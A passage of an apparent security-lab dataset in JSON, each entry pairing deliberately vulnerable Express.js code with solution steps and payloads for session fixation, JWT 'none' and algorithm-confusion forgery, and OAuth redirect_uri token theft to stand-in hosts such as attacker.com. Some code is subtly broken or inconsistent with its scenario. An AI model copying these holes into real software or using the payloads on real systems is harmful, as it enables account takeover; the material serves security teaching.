    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); const sid = req.cookies.session || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('session', sid); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') return res.send('Carlos account page'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=attackersession123",
      "Set session=attackersession123 before victim login",
      "Access /my-account with same cookie after victim logs in"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect exploit",
    "Lab Description": "The application integrates OAuth for user login using a third-party provider. However, the OAuth flow includes an open redirect flaw that allows attackers to hijack authorization codes. The redirect_uri parameter is not properly validated, enabling token leakage. To solve: Hijack Carlos's OAuth login to obtain a valid access token and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start OAuth flow and intercept the request to the authorization endpoint using Burp.",
      "Modify the redirect_uri to a controlled domain that reflects query parameters (e.g., http://evil.com/callback).",
      "Send a phishing link to Carlos with the crafted redirect_uri.",
      "Capture the leaked authorization code on the attacker's server.",
      "Exchange the stolen code at the token endpoint and use the access_token to call /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; request.post('https://oauth.provider.com/token', { form: { code, redirect_uri, client_id: 'client123', client_secret: 'secret456', grant_type: 'authorization_code' }}, (err, r, body) => { const token = JSON.parse(body).access_token; if (token) res.redirect(`${redirect_uri}?access_token=${token}`); else res.status(401).send('Token exchange failed'); }); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; if (token === 'token-for-carlos') res.send('Carlos OAuth account'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable.com/auth/callback?redirect_uri=http://evil.com/callback",
      "Intercepted code=abc123 from evil.com/callback?code=abc123",
      "POST to token endpoint with stolen code",
      "access_token=token-for-carlos"
    ]
  }
  ,
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "The session management system issues session IDs before user authentication, but fails to rotate them upon successful login. This opens the door to session fixation attacks. The application allows setting the session cookie manually and does not regenerate a new session ID post-login. To solve: fixate a session for Carlos before he logs in, then hijack it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET request to /login page and observe the Set-Cookie header with session ID.",
      "Send the session ID to Burp Repeater and preserve it manually.",
      "Initiate login as 'carlos' using a separate browser or Postman while forcing the reused session cookie.",
      "Confirm that session ID was not regenerated after login by observing session cookie value post-authentication.",
      "Replay a GET /account request using the fixed session ID to gain access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(2); res.cookie('session', sid); sessions[sid] = {}; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.session; sessions[sid].user = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]?.user; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
    "payloads": [
      "Inject known session ID via Cookie header: Cookie: session=fixedid123",
      "Login as Carlos in another tab using fixedid123",
      "Reuse fixedid123 to access /account as Carlos"
    ]
  }
,
{
    "Lab scenario": "JWT token algorithm manipulation",
    "Lab Description": "This lab uses JWTs for user sessions but fails to properly validate the signing algorithm. The application uses a 'none' algorithm without enforcing server-side signature verification. To solve: forge a valid JWT with 'alg' set to 'none' and impersonate the admin user to access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman or Burp to capture the JWT token after logging in as a low-privilege user.",
      "Decode the token using jwt.io and note the structure and claims.",
      "Craft a new token manually with 'alg' set to 'none' and payload: { \"username\": \"admin\" }.",
      "Remove the signature section and send the token in the Authorization header.",
      "Send GET /admin-account with forged JWT and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'rootpass' }, { username: 'user', password: 'userpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'none' }); res.json({ token }); } else { res.status(403).json({ message: 'Invalid credentials' }); } }); app.get('/admin-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token); if (decoded?.username === 'admin') { res.send('Admin panel access granted'); } else { res.status(401).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "JWT with alg: 'none' and payload: { \"username\": \"admin\" }",
      "Base64 encoded header: eyJhbGciOiJub25lIn0=",
      "Base64 encoded payload: eyJ1c2VybmFtZSI6ImFkbWluIn0=",
      "JWT: eyJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=."
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration with open redirect flow",
    "Lab Description": "This OAuth implementation allows redirection to arbitrary URLs after authentication due to missing state parameter validation. The 'redirect_uri' can be manipulated, enabling token theft via phishing. To solve: craft a malicious OAuth URL to intercept Carlos's token and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp and intercept a login request using OAuth to identify the authorization flow URL and parameters.",
      "Modify the 'redirect_uri' parameter to point to your controlled server (e.g., http://attacker.net/callback).",
      "Send the modified URL to the victim or simulate a redirect using curl/Postman.",
      "Capture the redirected URL with the access token in your server logs.",
      "Use the stolen token in an Authorization header to access /user-profile as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'token-for-carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/user-profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') { res.send('Profile of Carlos'); } else { res.status(401).send('Invalid token'); } }); app.listen(5000);",
    "payloads": [
      "GET /auth?redirect_uri=http://attacker.net/callback",
      "Intercepted access_token from attacker.net/callback",
      "Authorization: Bearer token-for-carlos"
    ]
  }
,
{
    "Lab scenario": "JWT signature spoof via 'none' algorithm",
    "Lab Description": "This lab implements JSON Web Token (JWT) based authentication using insecure algorithm handling. The server accepts tokens signed using the 'none' algorithm, allowing attackers to forge valid tokens without knowing the secret key. The application verifies the JWT token from the Authorization header and grants access to sensitive resources without verifying the signature when 'alg' is set to 'none'. To solve: Craft a forged JWT for Carlos's account and access his profile page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a request using Burp Suite and inspect the Authorization: Bearer <token> header.",
      "Decode the JWT using jwt.io or Burp Decoder and verify the structure and algorithm.",
      "Create a new JWT header with \"alg\":\"none\" and set the payload to {\"username\":\"carlos\"}. Remove the signature part.",
      "Replace the original token in the Authorization header with the unsigned token and forward the request.",
      "Verify access to Carlos's profile page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/profile', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') return res.send('Sensitive profile data for carlos'); } jwt.verify(token, 'supersecret'); res.send('Valid token'); } catch (err) { res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(JWT None Bypass Lab running on http://localhost:${PORT}));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "This lab is vulnerable to session fixation due to predictable session ID issuance. The application assigns session IDs before login and does not regenerate them after successful authentication. The attacker can pre-define a session ID and trick the victim into using it. To solve: Fix a session ID before Carlos logs in and use it to hijack his session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a request and note the Set-Cookie: session=... value before login.",
      "Send a crafted link to Carlos that contains a known session ID as a cookie value.",
      "Wait until Carlos logs in and reuses the known session ID.",
      "Send a GET /my-account request using the same session ID as the cookie.",
      "Confirm that Carlos’s account page is returned."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'securepass' }; const sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username] === password) { const sessionId = req.cookies.session; sessions[sessionId] = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session; const user = sessions[sessionId]; if (user === 'carlos') { res.send('Welcome to carlos's account'); } else { res.status(403).send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Cookie: session=known-session-id",
      "GET /login?username=carlos&password=securepass HTTP/1.1",
      "GET /my-account HTTP/1.1 with Cookie: session=known-session-id"
    ]
  },
  {
    "Lab scenario": "OAuth authorization code reuse",
    "Lab Description": "This lab’s OAuth implementation allows reuse of authorization codes, violating the single-use principle. An attacker who intercepts an unused authorization code can reuse it to log in as the victim. The app fails to invalidate codes after the first use. To solve: Capture Carlos's OAuth code and reuse it to gain access to his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp to proxy the OAuth flow and intercept the GET /oauth-callback?code=... request from Carlos.",
      "Save the captured code and allow Carlos’s original request to proceed.",
      "Send a new GET /oauth-callback?code=... request manually using the same code.",
      "Observe that a session is created and the user is authenticated as Carlos.",
      "Navigate to /my-account to verify the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const usedCodes = {}; const users = { 'authcode-carlos': 'carlos' }; app.get('/oauth-callback', (req, res) => { const { code } = req.query; if (usedCodes[code]) { return res.status(403).send('Code already used'); } const user = users[code]; if (user) { usedCodes[code] = true; res.cookie('session', user); res.send('Logged in as ' + user); } else { res.status(401).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(OAuth Code Reuse Lab running on http://localhost:${PORT}));",
    "payloads": [
      "GET /oauth-callback?code=authcode-carlos HTTP/1.1",
      "Cookie: session=carlos",
      "GET /my-account HTTP/1.1"
    ]
  }
  ,
  {
    "Lab scenario": "JWT tampering with none algorithm",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, it accepts tokens signed using the 'none' algorithm without verification. The application decodes the token and grants access based on the embedded user role. To solve: Forge a JWT granting admin privileges and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept JWT after login using Burp Suite and decode it using jwt.io.",
      "Observe the algorithm is set to 'HS256'. Change it to 'none' and remove the signature.",
      "Modify the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
      "Encode the modified header and payload without a signature.",
      "Use Postman to send a request with the tampered JWT in the Authorization header and verify access to /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access Denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\",\"role\":\"admin\"}.",
      "Authorization: Bearer <modified_jwt>"
    ]
  }
,
{
    "Lab scenario": "Session fixation through predictable session ID",
    "Lab Description": "The application sets session identifiers in the URL as query parameters after login. These session IDs are generated using predictable patterns. An attacker can fix a session ID for the victim and hijack the session post-login. To solve: Pre-set Carlos's session ID, trick him into logging in, then reuse the session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to crawl and identify that sessionID is passed in the URL (e.g., /dashboard?sessionID=12345).",
      "Send a crafted link with sessionID=abc123 to Carlos via social engineering.",
      "Once Carlos logs in, his session is bound to sessionID=abc123.",
      "Use the same session ID to access /dashboard?sessionID=abc123 from your browser.",
      "Confirm account access and view Carlos’s dashboard page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { const { username, password, sessionID } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sessionID] = username; res.redirect(`/dashboard?sessionID=${sessionID}`); } else { res.send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.query.sessionID]; if (user) { res.send(`Dashboard for ${user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(3000);",
    "payloads": [
      "/login?username=carlos&password=carlospass&sessionID=abc123",
      "/dashboard?sessionID=abc123",
      "sessionID=predefined_session_id"
    ]
  }
,
{
    "Lab scenario": "OAuth redirect_uri manipulation",
    "Lab Description": "This lab uses OAuth for login via a third-party provider. However, the application does not properly validate the redirect_uri parameter, allowing attackers to steal authorization codes. To solve: Intercept a login request and modify the redirect_uri to an attacker-controlled server, then extract the authorization code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the login flow and capture the OAuth authorization request.",
      "Locate the redirect_uri parameter pointing to /oauth-callback.",
      "Change it to your exploit server (e.g., https://attacker.com/callback) and forward the request.",
      "Receive the OAuth code on your exploit server and replay it to the real app’s /oauth-callback endpoint.",
      "Obtain a session token and use it to access the /my-account endpoint as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login', (req, res) => { const redirect_uri = req.query.redirect_uri; const auth_url = `https://oauth.provider/auth?client_id=abc&redirect_uri=${redirect_uri}&response_type=code`; res.redirect(auth_url); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth.provider/token', { code }); res.cookie('session', token.data.access_token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session) res.send('User Account Data'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "https://oauth.provider/auth?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code",
      "POST /oauth-callback?code=stolen-code",
      "session=<access_token_from_stolen_code>"
    ]
  }
,
{
    "Lab scenario": "JWT algorithm confusion in Authorization header",
    "Lab Description": "The application's JWT implementation accepts insecure algorithms during token validation. Specifically, it fails to enforce signature verification when the 'alg' field is modified to 'none'. The application trusts any Authorization: Bearer token that decodes to a valid user structure. To solve: craft a forged JWT token with 'none' algorithm and impersonate the user 'carlos' to access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request with a valid JWT after logging in.",
      "2. Decode the JWT using jwt.io or a Python script to observe its structure.",
      "3. Change the 'alg' header to 'none' and modify the payload to {\"username\": \"carlos\"}.",
      "4. Remove the JWT signature entirely and set the token as Authorization: Bearer <forged_token>.",
      "5. Send the modified request using Postman or Burp Repeater and observe access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = ['carlos', 'admin']; app.get('/account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') { res.send('Account page of carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\": \"none\"} + {\"username\": \"carlos\"}",
      "Authorization: Bearer <unsigned_JWT_with_carlos>"
    ]
  }
,
{
    "Lab scenario": "OAuth redirect URI manipulation in callback handler",
    "Lab Description": "The OAuth implementation improperly validates the redirect_uri parameter in the authentication flow. An attacker can manipulate the redirect to inject a malicious OAuth token or leak the access_token. To solve: manipulate the OAuth redirect to impersonate a victim user (carlos) and access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the OAuth login flow with Burp Suite or OWASP ZAP.",
      "2. Identify the redirect_uri parameter sent in the initial GET request to /oauth/authorize.",
      "3. Modify the redirect_uri to point to your attacker-controlled domain (e.g., https://attacker.com/callback).",
      "4. Capture the access_token redirected to your server and extract it from the query string.",
      "5. Replay an authenticated request using Postman with the stolen token in the Authorization header to impersonate Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; if (!client_id || !redirect_uri) return res.status(400).send('Missing parameters'); const token = 'access_token_for_carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer access_token_for_carlos') { res.send('Welcome Carlos'); } else { res.status(401).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
      "Captured token: access_token_for_carlos",
      "Authorization: Bearer access_token_for_carlos"
    ]
  }
,
{
    "Lab scenario": "Session fixation in Set-Cookie header",
    "Lab Description": "The application assigns session identifiers via a predictable scheme before authentication. It does not regenerate the session ID post-login, allowing attackers to fixate a session ID and later hijack the session once the victim logs in. To solve: pre-assign a session ID, get the victim to log in, and then use the same session ID to access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman or curl to access the application and receive a Set-Cookie with a session ID.",
      "2. Share the URL with the victim, ensuring the session ID is retained via URL or cookie.",
      "3. Wait for the victim to authenticate using the provided session.",
      "4. Reuse the session ID in a new request using Burp Repeater or curl.",
      "5. Confirm account access by requesting the /account endpoint and solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || `sess-${Date.now()}`; res.cookie('sid', sid); sessions[sid] = { authenticated: false }; res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid]) { sessions[sid].authenticated = true; res.send('Logged in'); } else { res.send('Error'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid] && sessions[sid].authenticated) { res.send('Welcome to Carlos account'); } else { res.status(403).send('Forbidden'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sid=sess-1712345678901",
      "Share link with victim using same session ID",
      "Access account with: Cookie: sid=sess-1712345678901"
    ]
  }
,
{
    "Lab scenario": "Session fixation via insecure Set-Cookie handling in login endpoint",
    "Lab Description": "The login process fails to invalidate pre-authentication session cookies. The application sets the session ID before the user logs in, and that same session persists after successful authentication. To solve: Hijack Carlos's session by fixing a known session ID before authentication and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Burp Suite to intercept the initial GET /login request and note the Set-Cookie: sessionId value.",
      "2.Send the unauthenticated sessionId to the victim via a malicious link, ensuring Carlos uses it.",
      "3.Once Carlos logs in using the fixed session ID, use the same session ID cookie to authenticate as him.",
      "4.Replay the GET /my-account request with the fixed session ID cookie.",
      "5.Confirm successful account access by verifying Carlos's account data in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'carlospass' }]; const sessions = {}; app.get('/login', (req, res) => { let sid = Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.send('Logged in'); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionId; if (sessions[sid]) res.send(`Account page for ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Use predefined sessionId in victim's cookie before login",
      "Replay sessionId in attacker's browser after victim logs in"
    ]
  }
,
{
    "Lab scenario": "JWT token tampering with symmetric algorithm substitution",
    "Lab Description": "This application uses JWTs for session management but supports algorithm substitution from RS256 to HS256 using a public key as the secret. To solve: Forge a valid JWT token for Carlos and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite or Postman to capture the JWT token issued after authentication.",
      "2.Decode the token header and replace \"alg\": \"RS256\" with \"alg\": \"HS256\".",
      "3.Use the server's public key as the HMAC secret key to sign a new JWT with 'username': 'carlos'.",
      "4.Replace the original JWT with your forged token in Authorization: Bearer header.",
      "5.Send a request to GET /my-account and verify access to Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const privateKey = fs.readFileSync('./private.pem'); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Account data for ${decoded.username}`); } catch { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Sign with HMAC using server's public key as secret"
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration with open redirect leading to token theft",
    "Lab Description": "The OAuth redirect_uri is not properly validated, enabling redirection to arbitrary domains. The app leaks the OAuth access token in the URL fragment. To solve: Steal Carlos's access token via a crafted phishing link and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use OWASP ZAP or Burp to observe the OAuth flow and note the redirect_uri parameter.",
      "2.Craft a phishing URL with redirect_uri set to your controlled domain and send it to Carlos.",
      "3.Extract the access_token from the URL fragment once Carlos authenticates.",
      "4.Use the stolen token in an Authorization: Bearer header.",
      "5.Send a GET request to /my-account and verify access to Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'token-for-carlos'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Account data for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com/callback",
      "Use stolen token: Authorization: Bearer token-for-carlos"
    ]
  }
,
{
    "Lab scenario": "JWT tampering via algorithm confusion in session token",
    "Lab Description": "This lab's JWT-based session handling is vulnerable to algorithm confusion. The server does not enforce strict verification of the signing algorithm. The application blindly trusts the `alg` field in the token. To solve: Forge a JWT token with algorithm `none` and escalate your privileges to admin to access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT after logging in with a regular user account.",
      "Send the token to Decoder and change the algorithm field in the JWT header from 'HS256' to 'none'.",
      "Remove the signature portion of the token completely.",
      "Modify the payload to include {\"username\":\"admin\"}.",
      "Forward the modified token in an Authorization header and access /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure session regeneration",
    "Lab Description": "This lab's session handling mechanism is vulnerable to session fixation. The server does not regenerate session IDs after successful login, allowing an attacker to set the session ID beforehand. To solve: Fix a known session ID, trick the victim into logging in, and access their session to view the My Account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to initiate a session as an attacker and capture the fixed session ID.",
      "Send a phishing link to the victim that includes the session ID as a cookie.",
      "Wait for the victim to log in using the provided session.",
      "Use the same session ID to access their account.",
      "Navigate to /my-account to verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = { carlos: 'pass123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.username = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') { res.send('Carlos account accessed'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4001; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: connect.sid=sess:abcd1234",
      "Phishing link with pre-set cookie: document.cookie = 'connect.sid=sess:abcd1234';"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "This lab simulates a misconfigured OAuth flow that allows redirect URI manipulation. The authorization server does not validate the redirect URI against a whitelist. To solve: Manipulate the redirect URI to intercept an OAuth authorization code and reuse it to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate the OAuth login flow and intercept the authorization request.",
      "Modify the `redirect_uri` parameter to a malicious domain under your control.",
      "Host a listener to capture the authorization code sent by the OAuth server.",
      "Exchange the captured code manually for an access token via Postman.",
      "Use the access token to authenticate as Carlos and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const redirectMap = {}; app.get('/auth', (req, res) => { const { code, redirect_uri } = req.query; if (!code) { const authURL = `https://oauth.example.com/auth?response_type=code&client_id=client123&redirect_uri=${redirect_uri}`; res.redirect(authURL); } else { redirectMap[code] = redirect_uri; res.send('Code received'); } }); app.get('/callback', async (req, res) => { const { code } = req.query; const redirect_uri = redirectMap[code]; const tokenResponse = await axios.post('https://oauth.example.com/token', { code, redirect_uri }); const accessToken = tokenResponse.data.access_token; if (accessToken === 'carlos-token') { res.send('Welcome Carlos'); } else { res.status(403).send('Invalid token'); } }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Redirect Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://oauth.example.com/auth?client_id=client123&redirect_uri=https://attacker.com/callback",
      "Authorization: Bearer carlos-token"
    ]
  }
  ,
  {
    "Lab scenario": "Session Fixation via Predictable Session ID",
    "Lab Description": "This lab's session management is vulnerable to session fixation. The server accepts session IDs from unauthenticated users and does not regenerate them upon login. The application stores the session ID in a cookie named sid. To solve: hijack Carlos's session and access his account page using a fixed session ID set before login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture pre-login traffic in Burp Suite and note the sid cookie structure",
      "Send a crafted request with a preset sid and log in as Carlos",
      "Craft a link with the same sid value and send it to Carlos",
      "After Carlos logs in, reuse the fixed sid to hijack the session",
      "Verify access to /my-account to solve the lab"
    ],
    "Vulnerability name": "Authentication",
